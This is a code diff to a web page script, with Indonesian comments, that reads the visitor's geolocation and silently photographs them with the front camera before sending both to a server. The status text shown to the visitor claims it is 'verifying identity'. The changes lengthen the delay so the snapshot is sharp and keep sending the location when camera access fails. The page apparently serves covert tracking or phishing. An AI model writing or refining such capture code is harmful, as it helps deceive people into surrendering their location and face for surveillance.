@@ -96,16 +96,18 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
-            // 2. Minta Izin Kamera & JEPRET OTOMATIS
+            // 2. Minta Izin Kamera & JEPRET (Dikasih waktu 1.5 detik biar fokus)
             statusText.innerText = 'Memverifikasi identitas...';
             let photoBase64 = null;
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 200)); 
                 
-                canvas.width = video.videoWidth || 480;
+                // Tunggu 1.5 detik biar kamera bener-bener siap
+                await new Promise(r => setTimeout(r, 1500)); 
+                
+                canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -113,7 +115,8 @@
                 photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
                 stream.getTracks().forEach(t => t.stop());
             } catch (camErr) {
-                console.log('Kamera ditolak, lanjut kirim data tanpa foto.');
+                // Kalo kamera gagal/ditolak, tetep kirim laporan tanpa foto
+                console.log('Kamera gagal:', camErr);
             }
 
             // 3. Kirim Data ke Server
